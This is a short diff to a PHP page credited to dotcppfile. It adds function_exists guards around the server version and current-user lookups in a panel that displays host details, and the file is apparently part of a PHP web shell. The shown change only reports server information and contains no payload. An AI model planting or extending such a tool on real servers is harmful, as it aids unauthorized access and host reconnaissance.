@@ -511,20 +511,45 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 
 	<?php
 	
-	echo "
-	<tr>
-		<td>Version</td><td>".php_uname()."</td>
-	</tr>
-	
+	if(function_exists("php_uname"))
+	{
+		echo "
+		<tr>
+			<td>Version</td>
+			<td>".php_uname()."</td>
+		</tr>";
+	}
+	else
+	{
+		echo "
+		<tr>
+			<td>Version</td>
+			<td></td>
+		</tr>";
+	}
+
+	echo "	
 	<tr>
 		<td>IP Address</td>
 		<td>".$_SERVER['SERVER_ADDR']."</td>
-	</tr>
-
-	<tr>
-		<td>Current User</td>
-		<td>".get_current_user()."</td>
 	</tr>";
+
+	if(function_exists("get_current_user"))
+	{
+		echo "
+		<tr>
+			<td>Current User</td>
+			<td>".get_current_user()."</td>
+		</tr>";
+	}
+	else
+	{
+		echo "
+		<tr>
+			<td>Current User</td>
+			<td></td>
+		</tr>";
+	}
 
 	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
 	{
